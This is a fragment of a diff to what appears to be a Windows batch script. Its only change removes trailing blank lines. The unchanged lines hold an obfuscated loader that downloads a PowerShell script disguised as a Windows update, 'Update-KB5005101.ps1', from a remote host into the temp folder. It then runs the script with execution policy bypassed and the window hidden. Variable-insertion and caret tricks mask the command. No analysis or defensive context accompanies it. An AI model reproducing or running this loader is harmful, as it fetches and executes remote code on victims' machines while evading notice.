@@ -5,11 +5,3 @@
 @powershell iwr -Uri "ht%i0%tp://CharlieBrown/Update-KB50%i0_%05101.ps1" -OutFile "%tmp%\Update-KB50%i0_%05101.ps1"
 @Cd %tmp% && ,pOw%_Socket(i)_%eR^sH%_i_%El^L -ExeC^ut%'b%I^oN ByP%\x0a%a^Ss -Win%_#1%dOw^stY^le hI%i0%d^Den -NoP%_i%r^Ofi%stuff%Le -Fi%Nall%l^E %tmp%\Update-KB50%i0_%05101.ps1
 @exit
-
-
-
-
-
-
-
-
